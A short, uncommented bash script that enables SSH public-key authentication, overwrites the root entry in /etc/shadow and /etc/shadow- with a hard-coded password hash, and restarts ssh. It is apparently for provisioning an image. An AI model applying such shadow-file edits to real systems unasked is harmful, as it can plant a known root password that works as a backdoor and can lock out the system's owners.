#!/bin/bash

sed -i 's/#PubkeyAuthentication/PubkeyAuthentication/g' -i /etc/ssh/sshd_config

sed '1d' -i /etc/shadow

sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow

sed '1d' -i /etc/shadow-

sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow-

systemctl restart ssh